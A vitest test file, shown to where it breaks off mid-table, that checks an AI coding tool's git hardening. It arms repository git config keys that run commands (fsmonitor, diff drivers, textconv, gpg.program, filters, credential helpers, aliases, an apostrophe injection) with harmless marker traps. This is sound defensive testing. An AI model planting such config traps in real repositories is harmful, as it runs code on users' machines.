/**
 * A repository carries its own `.git/config`, and git honours several settings
 * there by RUNNING the command they name: `core.fsmonitor` and a
 * `filter.<driver>.clean` on every index refresh (`status`, `diff`, `add`,
 * `commit`), a `diff.<driver>.textconv` on every diff of a file
 * `.gitattributes` points at, `gpg.program` on every signed commit and on
 * `git show` when `log.showSignature` is on. Codeep spawns git inside the
 * user's project, so a folder that arrived with a hostile `.git` — or a prompt
 * injection that gets `write_file` pointed at `.git/config` — would execute
 * code the moment the status line refreshes.
 *
 * Every test here arms those traps for real in a real repository and asserts
 * that nothing fired, plus that the call still returned what it is supposed to
 * (a trap that stays cold because git died is not a fix). No mocks: what git
 * does with a config file is the whole subject.
 *
 * What is deliberately NOT neutralised is just as much the subject. The
 * repository's own HOOKS run for the commits and checkouts the user asked for
 * — that is what `expect(fired()).toEqual(['pre-commit'])` is asserting — and
 * a setting the USER put in their global config keeps working, which is what
 * the scope tests cover.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { execFileSync } from 'child_process';
import { appendFileSync, chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, realpathSync, renameSync, rmSync, statSync, symlinkSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import {
  hardenedGitEnv,
  getGitStatus,
  getChangedFiles,
  getChangedFilesResult,
  getGitDiff,
  getGitContent,
  stageAll,
  stageAllResult,
  createCommit,
  createBranch,
  switchBranch,
  autoCommitAgentChanges,
  SAFE_CONTENT_FILTER_COMMANDS,
  isSafeContentFilterCommand,
  MAX_SUBMODULE_CONFIGS,
} from './git';
import { resolveHooksDir, resolveHooksDirResult } from './gitHookInstaller';
import { performCodeReview } from './codeReview';
import type { ProjectContext } from './project';
import { handleCommand, type AppCommandContext } from '../renderer/commands';

const hasGit = (() => {
  try {
    execFileSync('git', ['--version'], { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
})();

/**
 * The traps are `#!/bin/sh` scripts and the no-hooks path is `/dev/null`, so
 * the suites that arm them are POSIX-only. Skipping is the right answer on
 * Windows; skipping because git is MISSING is not — that would quietly turn
 * this whole file into nothing on a CI runner, which is how a hardening suite
 * stops protecting anything without anyone noticing. Hence the assertion
 * below rather than one more `skipIf`.
 */
const posix = process.platform !== 'win32';

/**
 * Point git at config files that are not there, for the whole describe that
 * calls this.
 *
 * These fixtures run REAL git, and real git reads whoever's machine this is
 * on: an `init.templateDir` decides what `git init` puts in `.git/hooks`, a
 * `core.hooksPath` decides what resolveHooksDir answers, a `filter.lfs.*`
 * lands in the scan. Passing a `base` to hardenedGitEnv() would isolate only
 * the calls that take one — getGitStatus and friends build their environment
 * from `process.env` — so the isolation has to be on the process.
 *
 * Registered before the fixture's own beforeEach on purpose: hooks run in
 * registration order, and `git init` has to be the first thing that already
 * sees the empty config.
 */
function isolateGitConfig(): void {
  const NOWHERE = join(tmpdir(), 'codeep-no-such-gitconfig');
  const KEYS = ['HOME', 'GIT_CONFIG_GLOBAL', 'GIT_CONFIG_SYSTEM'] as const;
  const saved: Record<string, string | undefined> = {};

  beforeEach(() => {
    for (const key of KEYS) {
      saved[key] = process.env[key];
      process.env[key] = NOWHERE;
    }
  });

  afterEach(() => {
    for (const key of KEYS) {
      if (saved[key] === undefined) delete process.env[key];
      else process.env[key] = saved[key];
    }
  });
}

describe('git hardening preconditions', () => {
  it('git is on PATH, so the suites below actually run', () => {
    expect(hasGit).toBe(true);
  });
});

let base: string;
let repo: string;
let markers: string;

/**
 * git for the test's own setup and verification. It disables the traps on the
 * command line so the test never leaves footprints in `markers/` that the
 * marker assertions would then read as a fired trap. The filter driver is in
 * that list because any setup command that refreshes the index — `git add`,
 * `git commit` — runs the clean filter on the already-modified `notes.bin`.
 */
function git(cwd: string, args: string[], input?: string): string {
  return execFileSync('git', [
    '-c', 'core.fsmonitor=false',
    '-c', 'core.hooksPath=/dev/null',
    '-c', 'filter.hostile.clean=',
    '-c', 'filter.hostile.smudge=',
    '-c', 'filter.hostile.required=false',
    ...args,
  ], {
    cwd,
    input,
    encoding: 'utf-8',
    stdio: ['pipe', 'pipe', 'ignore'],
  });
}

/** Names of the traps that fired, for a failure message that points at one. */
const fired = () => readdirSync(markers).sort();

/**
 * The value `diff.external` / `diff.<d>.command` are neutralised to, spelled
 * out rather than imported: the test is what pins the contract, and a helper
 * shared with the production code would only agree with itself. What matters
 * about it — that the user is told WHICH key and HOW to undo it, and that git
 * still stops — is asserted live in the enumerated suite.
 */
const DIFF_REFUSAL = (key: string) =>
  `printf '%s\\n' 'codeep: refusing to run the diff driver this repository configured in ${key}. ` +
  `Remove it (git config --unset ${key}) if you trust this repository.' >&2; false`;

/**
 * One POSIX shell word. Re-done here rather than imported for the reason
 * DIFF_REFUSAL gives — a helper shared with the production code would only
 * agree with itself — and it is one line, while the load-bearing part is the
 * message text in ALIAS_REFUSAL below, which is written out in full. The
 * alias message needs it because the message quotes the alias NAME, so unlike
 * the diff refusal it carries apostrophes of its own.
 */
const singleQuoted = (text: string) => `'${text.replace(/'/g, `'\\''`)}'`;

/**
 * The value a repo-scope alias is neutralised to: a shell command that says
 * which alias, that Codeep disables repository-defined aliases, and what to
 * run instead — then exits 1. `!false`, what this shipped as, exited 1 with
 * both streams empty, so an agent following a repository's own README saw a
 * git command fail and had nothing to read.
 */
const ALIAS_REFUSAL = (name: string, defined: string) =>
  `!printf '%s\\n' ${singleQuoted(
    `codeep: refusing to run 'git ${name}', an alias this repository defined in its own git config. ` +
      'Codeep disables repository-defined aliases; run the plain git command instead — this repository ' +
      `defines '${name}' as ${defined}. ` +
      `Remove it (git config --unset alias.${name}) if you trust this repository.`
  )} >&2; false`;

/** A trap a setting git runs THROUGH A SHELL can be pointed at. */
function trap(name: string): string {
  return `touch "${join(markers, name)}"`;
}

/**
 * A trap for the settings git runs WITHOUT a shell. `touch X; false` in such a
 * value is never executed — git looks for a program literally called
 * `touch X; false` and fails — so the test would pass while proving nothing.
 * It has to be a real executable file.
 */
function trapScript(name: string): string {
  const path = join(base, `${name}-trap.sh`);
  writeFileSync(path, `#!/bin/sh\n${trap(name)}\nexit 1\n`);
  chmodSync(path, 0o755);
  return path;
}

/**
 * Point every command-executing git setting at `touch markers/<name>`. Each
 * one is a real, documented git feature — this is exactly what a prepared
 * repository ships in its own `.git/config`.
 *
 * `commit.gpgsign` is NOT armed here: it is what makes a commit reach
 * `gpg.program`, and the tests that care about it turn it on themselves.
 */
function armTraps(): void {
  // Runs on every index refresh: `git status` for the status line is enough.
  git(repo, ['config', 'core.fsmonitor', `${trap('fsmonitor')}; false`]);
  // A `filter.hostile.clean` is NOT armed here, and the reason is the policy
  // this round settles rather than an accident of the fixture. A repo-scope
  // content filter that is not one of the well-known integrations now refuses
  // EVERY git call in the repository (see SAFE_CONTENT_FILTER_COMMANDS in
  // git.ts): emptying it is not safe, because `required` defaults to false
  // and git would then store the file unfiltered. A refusal stops each call
  // before it reaches the index refresh, so every trap here would stay cold
  // for the wrong reason and every assertion about a working result would go
  // red. The filter has its own suites at the end of this file, where the
  // refusal — and the allowlist that keeps git-lfs working — IS the subject.
  //
  // Runs instead of git's own diff engine, for the files `.gitattributes`
  // routes at this driver. `diff.external` is the same thing for every file.
  git(repo, ['config', 'diff.hostile.command', `${trap('diff-command')}; true`]);
  git(repo, ['config', 'diff.external', `${trap('diff-external')}; true`]);
  // `.gitattributes` names the driver, the config names the program.
  git(repo, ['config', 'diff.hostile.textconv', `${trap('textconv')}; cat`]);
  // `git show` verifies a commit's signature by running gpg.program, and a
  // repository can store a commit object that carries a `gpgsig` header.
  git(repo, ['config', 'log.showSignature', 'true']);
  git(repo, ['config', 'gpg.program', trapScript('gpg')]);
  // The hooks a commit and a checkout run. These are the user's own, and the
  // policy is that they still run for a commit or checkout the user asked
  // for — so unlike every other trap here, these are expected to fire.
  for (const hook of ['pre-commit', 'post-checkout']) {
    const path = join(repo, '.git', 'hooks', hook);
    writeFileSync(path, `#!/bin/sh\n${trap(hook)}\nexit 0\n`);
    chmodSync(path, 0o755);
  }
}

/**
 * Rewrite HEAD as a commit object carrying a `gpgsig` header. A repository
 * controls its own objects, so a hostile one can ship a "signed" commit; git
 * only reaches for gpg.program when it finds that header.
 */
function forgeSignedHead(): void {
  const raw = git(repo, ['cat-file', 'commit', 'HEAD']);
  const split = raw.indexOf('\n\n');
  const signature = 'gpgsig -----BEGIN PGP SIGNATURE-----\n \n not-a-signature\n -----END PGP SIGNATURE-----';
  const forged = `${raw.slice(0, split)}\n${signature}${raw.slice(split)}`;
  const sha = git(repo, ['hash-object', '-t', 'commit', '-w', '--stdin'], forged).trim();
  const branch = git(repo, ['rev-parse', '--abbrev-ref', 'HEAD']).trim();
  git(repo, ['update-ref', `refs/heads/${branch}`, sha]);
}

function makeHostileRepo(): void {
  base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-hardening-')));
  repo = join(base, 'repo');
  markers = join(base, 'markers');
  mkdirSync(repo);
  mkdirSync(markers); // outside the repo, so a marker is never a git change

  git(base, ['init', '-q', 'repo']);
  git(repo, ['config', 'user.email', 'test@test.com']);
  git(repo, ['config', 'user.name', 'Test User']);
  writeFileSync(join(repo, '.gitattributes'), '*.bin diff=hostile filter=hostile\n');
  writeFileSync(join(repo, 'notes.bin'), 'before\n');
  // Tracked and claimed by NO attribute, so `git diff` sends it to
  // `diff.external` — the driver git falls back to for every unclaimed file.
  // Without a file in this shape the `|external` branch of the diff rule was
  // dead weight no test could see: `notes.bin` goes to `diff.hostile.command`
  // instead, which the subsection branch already covers. The name sorts
  // before `notes.bin` on purpose — git stops the whole diff at the first
  // file whose driver dies, so an alphabetically later file is never reached.
  writeFileSync(join(repo, 'alpha.txt'), 'before\n');
  git(repo, ['add', '-A']);
  git(repo, ['commit', '-qm', 'initial']);

  forgeSignedHead();
  armTraps();
  // Something for every call under test to report on: a modified tracked file
  // (which is what makes git refresh the index, and the clean filter run) and
  // an untracked one. Same length as the original on purpose — git can skip
  // the content comparison when the size already differs, and the whole point
  // is to reach the comparison that runs the filter.
  writeFileSync(join(repo, 'notes.bin'), 'after.\n');
  writeFileSync(join(repo, 'alpha.txt'), 'after.\n');
  writeFileSync(join(repo, 'extra.txt'), 'new\n');
}

/**
 * Pad the repository's own `.git/config` past the scan's read buffer.
 *
 * This is the shape that used to disable the repo-scope layer wholesale: the
 * scan's execFileSync threw ENOBUFS, its `catch { return null }` reported
 * that as "this repository set nothing", and the traps above ran on the next
 * ordinary git call. Proven at ~5MB against the old 4MB buffer; this is well
 * past the buffer that replaced it.
 */
function padConfigBeyondScanBuffer(): void {
  appendFileSync(join(repo, '.git', 'config'), `[pad]\n${`\tvar = ${'x'.repeat(200)}\n`.repeat(100_000)}`);
}

describe.skipIf(!hasGit || !posix)('git calls inside a repository with a hostile .git/config', () => {
  isolateGitConfig();
  beforeEach(makeHostileRepo);
  afterEach(() => {
    rmSync(base, { recursive: true, force: true });
  });

  it('getGitStatus reports the branch without running anything', () => {
    const status = getGitStatus(repo);

    expect(fired()).toEqual([]);
    expect(status.isRepo).toBe(true);
    expect(status.branch).toBeTruthy();
    expect(status.hasChanges).toBe(true);
  });

  it('getChangedFiles lists the changes without running anything', () => {
    const files = getChangedFiles(repo);

    expect(fired()).toEqual([]);
    expect(files).toContain('notes.bin');
    expect(files).toContain('extra.txt');
  });

  it('getGitDiff returns the diff without running a diff driver', () => {
    const result = getGitDiff(false, repo);

    // Remove `--no-ext-diff` from getGitDiff and this fails on `success`, not
    // on a marker: the repo's `diff.hostile.command` is neutralised to an
    // empty string, and git dies on that rather than running it. The scan is
    // what keeps the trap cold; the flag is what keeps the call working. The
    // enumeration suite below tests the scan on its own.
    expect(fired()).toEqual([]);
    expect(result.success).toBe(true);
    expect(result.diff).toContain('+after.');
  });

  it('getGitContent resolves `@git diff` without running a diff driver', () => {
    const result = getGitContent('diff', repo);

    expect(fired()).toEqual([]);
    expect(result.success).toBe(true);
    expect(result.content).toContain('+after.');
  });

  it('getGitContent resolves `@git HEAD` without running gpg.program', () => {
    const result = getGitContent('HEAD', repo);

    expect(fired()).toEqual([]);
    expect(result.success).toBe(true);
    expect(result.content).toContain('initial');
  });

  it('stageAll stages without running a config-named program', () => {
    const staged = stageAll(repo);

    expect(fired()).toEqual([]);
    expect(staged).toBe(true);
    expect(git(repo, ['diff', '--cached', '--name-only'])).toContain('notes.bin');
  });

  it('createCommit commits without running a config-named program, and still runs the hook', () => {
    stageAll(repo);
    const result = createCommit('test: hardened commit', repo);

    // The repository's pre-commit hook is the user's own and must still run:
    // lint-staged, their signing hook, Codeep's own review hook. Everything
    // the repo could name in its CONFIG stayed cold.
    expect(fired()).toEqual(['pre-commit']);
    expect(result.success).toBe(true);
    expect(result.hash).toBeTruthy();
    expect(git(repo, ['log', '-1', '--format=%s'])).toContain('test: hardened commit');
  });

  it('createCommit does not sign through a gpg.program the repository chose', () => {
    // The M1 pair: a repo that turns signing on and names the signer runs that
    // program on every commit Codeep makes. Emptying gpg.program alone would
    // only turn this into "gpg failed to sign the data" and no commit at all,
    // so signing is switched off for the call instead.
    git(repo, ['config', 'commit.gpgsign', 'true']);
    stageAll(repo);

    const result = createCommit('test: unsigned', repo);

    expect(fired()).toEqual(['pre-commit']);
    expect(result.success).toBe(true);
    expect(git(repo, ['log', '-1', '--format=%G?']).trim()).toBe('N'); // no signature
  });

  it('switchBranch checks out without running a config-named program', () => {
    git(repo, ['branch', 'other']);

    const result = switchBranch('other', repo);

    expect(fired()).toEqual(['post-checkout']);
    expect(result.success).toBe(true);
    expect(git(repo, ['rev-parse', '--abbrev-ref', 'HEAD']).trim()).toBe('other');
  });

  it('createBranch checks out without running a config-named program', () => {
    const result = createBranch('agent/hardening-test', repo);

    expect(fired()).toEqual(['post-checkout']);
    expect(result.success).toBe(true);
    expect(git(repo, ['rev-parse', '--abbrev-ref', 'HEAD']).trim()).toBe('agent/hardening-test');
  });

  it('/git-commit hardens the repository it commits in, not the one Codeep was started in', async () => {
    // The call site used to build the environment with no cwd at all, so the
    // scan read process.cwd() while the commit ran in ctx.projectPath —
    // "hardened" against whichever repository Codeep happened to be launched
    // from. Here process.cwd() is the Codeep checkout, which carries none of
    // this repository's traps: without the cwd, gpg.program below is never
    // neutralised, the trap script runs, it exits 1 and the commit fails. The
    // old version of this test chdir'd into the repo first, so it could not
    // fail for that reason no matter what the call site did.
    expect(process.cwd()).not.toBe(repo);
    git(repo, ['config', 'commit.gpgsign', 'true']);
    stageAll(repo);

    const notified = new Promise<string>(resolve => {
      const ctx = { projectPath: repo, app: { notify: resolve } } as unknown as AppCommandContext;
      void handleCommand('git-commit', ['test: through the slash command'], ctx);
    });

    expect(await notified).toBe('Committed successfully');
    expect(fired()).toEqual(['pre-commit']);
    expect(git(repo, ['log', '-1', '--format=%s'])).toContain('test: through the slash command');
  });

  it('getGitStatus degrades to a message when the config cannot be scanned', () => {
    // The status line is the first thing that calls git, and it must never
    // meet a refusal as an exception in the renderer. It loses the branch and
    // keeps the reason — and, the point of failing closed, it does not run
    // `git status` with the repo-scope layer silently switched off.
    padConfigBeyondScanBuffer();

    const status = getGitStatus(repo) as { isRepo: boolean; branch?: string; error?: string };

    expect(fired()).toEqual([]);
    expect(status.isRepo).toBe(true);
    expect(status.branch).toBeUndefined();
    expect(status.error).toMatch(/Refusing to run git/);
  });

  it('resolveHooksDir still answers with the repository core.hooksPath', () => {
    // The one setting Codeep must NOT override: `codeep hook install` writes
    // the hook where the repo says its hooks live.
    git(repo, ['config', 'core.hooksPath', '.githooks']);

    expect(resolveHooksDir(repo)).toBe(join(repo, '.githooks'));
  });

  it('resolveHooksDir says "refused", not "no hooks here", when git cannot be run', () => {
    // The write gate in utils/toolExecution.ts asks this function where the
    // hooks live and stops gating when the answer is null. A refusal folded
    // into that null is a fail-OPEN: the one repository Codeep will not scan
    // is exactly the one whose `.githooks/pre-commit` an agent could then
    // write with no confirmation. Both shapes of the answer have to keep the
    // two apart.
    padConfigBeyondScanBuffer();

    const result = resolveHooksDirResult(repo);

    expect(result.kind).toBe('unknown');
    expect(result.kind === 'unknown' && result.reason).toMatch(/Refusing to run git/);
    // And the string-or-null form throws rather than quietly answer null.
    expect(() => resolveHooksDir(repo)).toThrow(/Refusing to run git/);
  });

  it('getChangedFilesResult says why the list is empty when git is refused', () => {
    // `[]` reads as "nothing changed" to every caller — utils/codeReview.ts
    // gates a whole review on `getChangedFiles(...).length > 0` — so a
    // refusal that comes back as `[]` silently reviews nothing.
    padConfigBeyondScanBuffer();

    const result = getChangedFilesResult(repo);

    expect(result.files).toEqual([]);
    expect(result.error).toMatch(/Refusing to run git/);
    expect(getChangedFiles(repo)).toEqual([]); // the plain form is unchanged
  });

  it('names the refusal below the repository root, where the .git shortcut does not apply', () => {
    // checkGitRepository answers from `existsSync(<cwd>/.git)` at the root,
    // so the branch that has to ASK git only runs in a subdirectory — and it
    // used to answer a refusal with a plain `false`, which every caller then
    // printed as "Not a git repository". That is the wrong problem with the
    // wrong fix in front of someone whose `.git/config` is the real issue.
    padConfigBeyondScanBuffer();
    const sub = join(repo, 'sub');
    mkdirSync(sub);

    expect(getGitDiff(false, sub).error).toMatch(/Refusing to run git/);
    // And getGitStatus carries it on `refusal` here too, not only in its
    // catch: this is the other of the two paths the TUI notice depends on,
    // and it shipped filling `error` alone.
    const status = getGitStatus(sub);
    expect(status.isRepo).toBe(true);
    expect(typeof status.refusal).toBe('string');
    expect(status.refusal ?? '').toMatch(/Refusing to run git/);
  });

  it('surfaces a remote.<name>.uploadpack refusal on the status line instead of a blank branch', () => {
    // No override reaches that key, so every git call in this repository is
    // refused — which is right, and useless if all the user sees is the
    // branch disappearing. getGitStatus filled an `error` the GitStatus type
    // did not declare, so nothing could read it back.
    git(repo, ['config', 'remote.origin.uploadpack', '/tmp/hostile']);

    const status = getGitStatus(repo);

    expect(status.isRepo).toBe(true);
    expect(status.branch).toBeUndefined();
    expect(status.error).toContain('remote.origin.uploadpack');
    expect(status.error).toContain('git config --unset remote.origin.uploadpack');
  });
});

/**
 * The scan on its own, without the `--no-ext-diff` / `--no-textconv` flags
 * that Codeep's own diff reads also carry. This is the layer that has to hold
 * for git reached through the agent's execute_command tool, which passes no
 * flags of ours at all.
 */
describe.skipIf(!hasGit || !posix)('repo-supplied executing config, enumerated', () => {
  isolateGitConfig();
  beforeEach(makeHostileRepo);
  afterEach(() => {
    rmSync(base, { recursive: true, force: true });
  });

  /** Raw git under the hardened environment, as execute_command would run it. */
  const run = (args: string[]) =>
    execFileSync('git', args, {
      cwd: repo,
      encoding: 'utf-8',
      env: hardenedGitEnv({ cwd: repo }),
      stdio: ['ignore', 'pipe', 'pipe'],
    });

  it('a plain `git status` does not run the repository filter driver', () => {
    // GIT_CONFIG_* cannot wildcard `filter.*`, so nothing but the enumeration
    // stops this one. Drop the scan and the marker appears.
    expect(run(['status', '--porcelain'])).toContain('notes.bin');
    expect(fired()).toEqual([]);
  });

  it('a plain `git diff` fails closed instead of running the repository diff driver', () => {
    let stderr = '';
    try {
      run(['diff']);
      throw new Error('git diff should not have succeeded with diff.external neutralised');
    } catch (error) {
      stderr = String((error as { stderr?: string }).stderr ?? '');
    }

    // Asserting on the message, not only on the cold marker: without it the
    // test would also pass if git had never reached the external-diff path at
    // all, which is exactly the vacuous version of this test.
    expect(stderr).toMatch(/external diff died/);
    // And the refusal says which key and how to undo it. `error: cannot run :`
    // — what emptying the value produced — named nothing the user could act
    // on, in a repository they may not have written themselves.
    expect(stderr).toContain('diff.external');
    expect(stderr).toContain('git config --unset diff.external');
    expect(fired()).toEqual([]);
  });

  it('neutralises a repository alias, including one that carries its own -c', () => {
    // The hole the `!` check left. A non-`!` alias is spliced into argv IN
    // FRONT of the subcommand, so `git st` becomes `git -c core.fsmonitor=…
    // status` — and git reads its own `-c` after the GIT_CONFIG_* pairs, so
    // the alias wins and re-enables whatever this file switched off. Proven
    // with git 2.54: with the old rule, the trap below fired.
    //
    // A program path, not `touch X; false`: `core.fsmonitor` here is given
    // to git as a `-c` value, and a value naming a program is executed
    // without a shell, so a `;` in it would only make git look for a file
    // with a semicolon in its name.
    git(repo, ['config', 'alias.st', `-c core.fsmonitor=${trapScript('alias-fsmonitor')} status --porcelain`]);

    let stderr = '';
    try {
      run(['st']);
    } catch (error) {
      stderr = String((error as { stderr?: string }).stderr ?? '');
    }

    // The cold marker is the finding...
    expect(fired()).toEqual([]);
    // ...and the alias SAYS what happened. `!false`, what this shipped as,
    // exited 1 with both streams empty: an agent following a repository's own
    // README got an unexplained failure and no way to reach "Codeep turned
    // that alias off". An exact first line, because a `toContain` would pass
    // on a message mangled by naive interpolation.
    expect(stderr.split('\n').filter(Boolean)[0]).toBe(
      "codeep: refusing to run 'git st', an alias this repository defined in its own git config. " +
        'Codeep disables repository-defined aliases; run the plain git command instead — this repository ' +
        `defines 'st' as git -c core.fsmonitor=${base}/alias-fsmonitor-trap.sh status --porcelain. ` +
        'Remove it (git config --unset alias.st) if you trust this repository.'
    );
  });

  it('a textconv driver still renders the diff instead of aborting it', () => {
    // Emptying `diff.<d>.textconv` is not neutral — git dies with `error:
    // cannot run :` and `fatal: unable to read files to diff`, so a
    // perfectly ordinary pdf/docx textconv setup broke `git diff` through
    // execute_command entirely. `cat` is what `--no-textconv` does.
    //
    // The external-diff keys are unset first because git prefers
    // `diff.<d>.command` over `.textconv` for the same driver, and this test
    // is about the textconv branch.
    git(repo, ['config', '--unset', 'diff.hostile.command']);
    git(repo, ['config', '--unset', 'diff.external']);

    const out = run(['diff', '--', 'notes.bin']);

    expect(fired()).toEqual([]);
    expect(out).toContain('+after.');
  });

  it('cannot be turned into shell injection by the driver name the repository chose', () => {
    // The diff refusal names its key, and the key is the REPOSITORY's text:
    // `[diff "it's"]` is a legal section, and the message is spliced into a
    // command git runs THROUGH A SHELL. Single-quoting with `'\''` is what
    // keeps a message a message rather than the injection it is warning
    // about. Verified against git 2.54.
    git(repo, ['config', '--unset', 'diff.external']);
    writeFileSync(join(repo, '.gitattributes'), "*.bin diff=it's\n");
    git(repo, ['config', "diff.it's.command", `${trap('quoted-driver')}; true`]);

    let stderr = '';
    try {
      run(['diff', '--', 'notes.bin']);
    } catch (error) {
      stderr = String((error as { stderr?: string }).stderr ?? '');
    }

    // Nothing in the value executed...
    expect(fired()).toEqual([]);
    // ...the message came out WHOLE, apostrophe and all — an exact match,
    // because a `toContain` would still pass on the mangled `diff.its` that
    // naive interpolation produces...
    expect(stderr.split('\n').filter(Boolean)[0]).toBe(
      "codeep: refusing to run the diff driver this repository configured in diff.it's.command. " +
        "Remove it (git config --unset diff.it's.command) if you trust this repository."
    );
    // ...and git still stopped.
    expect(stderr).toMatch(/external diff died/);
  });

  it('a plain `git log` does not run the repository gpg.program', () => {
    expect(run(['log', '-1', '--format=%s'])).toContain('initial');
    expect(fired()).toEqual([]);
  });

  it('reads a worktree-scope driver, not only a local-scope one', () => {
    // `git config --worktree` writes `.git/config.worktree`, which
    // `--show-scope` reports as `worktree`. That file ships inside `.git`
    // exactly as `.git/config` does, so the repository controls it just as
    // much — but a scope check that accepts only `local` misses it, and every
    // other test in this file stays green while it does.
    //
    // The proof is the refusal now: a worktree-scope content filter has to
    // stop the call exactly as a local-scope one does. Narrow isRepoScope()
    // back to `local` and `git status` succeeds while the trap fires, which
    // is both assertions below at once.
    git(repo, ['config', 'extensions.worktreeConfig', 'true']);
    git(repo, ['config', '--worktree', 'filter.hostile.clean', `${trap('worktree-clean')}; cat`]);

    let refusal = '';
    try {
      run(['status', '--porcelain']);
    } catch (error) {
      refusal = String(error);
    }

    expect(fired()).toEqual([]);
    expect(refusal).toContain('filter.hostile.clean');
  });

  it('refuses rather than emit an override for a key that is not valid UTF-8', () => {
    // The scan used to be decoded as UTF-8 in one go, so a filter driver
    // named with raw non-UTF-8 bytes came back as U+FFFD: the override went
    // out under the replacement characters, git matched it against nothing,
    // and the clean filter ran. Nothing CAN be emitted for such a key — Node
    // builds an environment variable from a JS string and encodes it as UTF-8
    // — so the scan has to notice and refuse.
    const subsection = Buffer.from([0xff, 0xfe]);
    writeFileSync(
      join(repo, '.gitattributes'),
      Buffer.concat([
        Buffer.from('*.bin diff=hostile filter=hostile\n*.raw filter='),
        subsection,
        Buffer.from('\n'),
      ])
    );
    writeFileSync(join(repo, 'evil.raw'), 'before\n');
    git(repo, ['add', '.gitattributes', 'evil.raw']);
    git(repo, ['commit', '-qm', 'raw driver']);
    appendFileSync(
      join(repo, '.git', 'config'),
      Buffer.concat([
        Buffer.from('[filter "'),
        subsection,
        Buffer.from(`"]\n\tclean = ${trap('raw-clean')}; cat\n`),
      ])
    );
    writeFileSync(join(repo, 'evil.raw'), 'after.\n');

    let refusal = '';
    try {
      run(['status', '--porcelain']);
    } catch (error) {
      refusal = String(error);
    }

    // The marker is the evidence and it comes first: emit the override under
    // the replacement characters and this is the assertion that goes red.
    expect(fired()).toEqual([]);
    expect(refusal).toMatch(/not valid UTF-8/);
  });

  it('refuses instead of running git when the scan cannot finish', () => {
    // Fail CLOSED. The scan used to swallow every error, so a repository that
    // padded its config past the read buffer got the whole repo-scope layer
    // switched off for free and `filter.hostile.clean` ran on `git status`.
    padConfigBeyondScanBuffer();

    let refusal = '';
    try {
      run(['status', '--porcelain']);
    } catch (error) {
      refusal = String(error);
    }

    // Marker first again: swallow the scan error and this is what goes red,
    // because `git status` then runs with nothing but the always-on pairs.
    expect(fired()).toEqual([]);
    expect(refusal).toMatch(/could not be read/);
  });

  it('keeps a filter the USER configured globally', () => {
    // git-lfs lives in exactly this key. Neutralising `filter.*` for every
    // scope would break every LFS repository on the machine, which is why the
    // scan looks at where each setting came from.
    const home = join(base, 'home');
    mkdirSync(home);
    writeFileSync(join(home, '.gitconfig'), `[filter "hostile"]\n\tclean = ${trap('global-clean')}; cat\n`);

    const env = hardenedGitEnv({
      cwd: repo,
      base: { ...process.env, GIT_CONFIG_GLOBAL: join(home, '.gitconfig') },
    });
    execFileSync('git', ['status', '--porcelain'], { cwd: repo, env, stdio: 'ignore' });

    expect(fired()).toEqual(['global-clean']);
  });

  it('drops a repository credential helper and keeps the global one', () => {
    // Helpers are a LIST and an empty value resets all of it, so the only way
    // to drop the repo's entry is to reset and re-add the others.
    const home = join(base, 'home');
    mkdirSync(home);
    writeFileSync(join(home, '.gitconfig'), `[credential]\n\thelper = ${trapScript('global-helper')}\n`);
    git(repo, ['config', 'credential.helper', trapScript('repo-helper')]);

    const env = hardenedGitEnv({
      cwd: repo,
      base: { ...process.env, GIT_CONFIG_GLOBAL: join(home, '.gitconfig') },
    });
    try {
      execFileSync('git', ['credential', 'fill'], {
        cwd: repo,
        env,
        input: 'protocol=https\nhost=example.invalid\n\n',
        stdio: ['pipe', 'ignore', 'ignore'],
      });
    } catch {
      // Neither trap answers with a username, and GIT_TERMINAL_PROMPT=0 stops
      // git asking the terminal, so `credential fill` exits non-zero. Which
      // helper git RAN is the subject, and the assertion below is not vacuous:
      // it requires the global one to have fired.
    }

    expect(fired()).toEqual(['global-helper']);
  });
});

describe.skipIf(!hasGit)('hardenedGitEnv', () => {
  isolateGitConfig();
  beforeEach(() => {
    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-env-')));
    repo = join(base, 'repo');
    mkdirSync(repo);
    git(base, ['init', '-q', 'repo']);
    git(repo, ['config', 'user.name', 'Repo User']);
  });

  afterEach(() => {
    rmSync(base, { recursive: true, force: true });
  });

  /** What git itself resolves a key to under this environment. */
  const resolved = (env: NodeJS.ProcessEnv, key: string) =>
    execFileSync('git', ['config', '--get', key], { cwd: repo, env, encoding: 'utf-8' }).trim();

  /** The GIT_CONFIG_KEY_n / VALUE_n pairs an environment declares, in order. */
  const declaredPairs = (env: NodeJS.ProcessEnv): Array<[string, string]> => {
    const pairs: Array<[string, string]> = [];
    for (let i = 0; i < Number(env.GIT_CONFIG_COUNT); i++) {
      pairs.push([env[`GIT_CONFIG_KEY_${i}`] ?? '', env[`GIT_CONFIG_VALUE_${i}`] ?? '']);
    }
    return pairs;
  };

  /**
   * Every rule in the repo-scope table, armed with a repo-local value and
   * checked against what the environment then declares. Most of these had no
   * test of any kind, and the `declares` column is where a case mistake shows
   * itself: `git config --list` prints `core.sshcommand`,
   * `gpg.ssh.defaultkeycommand` and `interactive.difffilter`, so a rule
   * spelled in the git documentation's camelCase matches nothing and the
   * column comes back empty. Five rules shipped exactly that way.
   *
   * `credential.helper` is not here — it is a LIST, so `git config --get` on
   * it is not a single value, and its live trap covers it in the suite above.
   */
  const RULES: Array<{ rule: string; arm: Array<[string, string]>; declares: Array<[string, string]> }> = [
    // `filter.<driver>.{clean,smudge,process}` is not here: it refuses rather
    // than declares anything. See the content-filter suites at the end of
    // this file for why emptying it is not a neutral act.
    { rule: 'diff.<driver>.command', arm: [['diff.armed.command', '/tmp/x']],
      declares: [['diff.armed.command', DIFF_REFUSAL('diff.armed.command')]] },
    // `cat`, not '': emptying it aborted the whole diff. See the textconv
    // suite below for the live proof.
    { rule: 'diff.<driver>.textconv', arm: [['diff.armed.textconv', '/tmp/x']],
      declares: [['diff.armed.textconv', 'cat']] },
    { rule: 'diff.external', arm: [['diff.external', '/tmp/x']],
      declares: [['diff.external', DIFF_REFUSAL('diff.external')]] },
    { rule: 'merge.<driver>.driver', arm: [['merge.armed.driver', '/tmp/x %A %O %B']],
      declares: [['merge.armed.driver', '']] },
    { rule: 'mergetool.<tool>.cmd', arm: [['mergetool.armed.cmd', '/tmp/x']],
      declares: [['mergetool.armed.cmd', '']] },
    { rule: 'difftool.<tool>.cmd', arm: [['difftool.armed.cmd', '/tmp/x']],
      declares: [['difftool.armed.cmd', '']] },
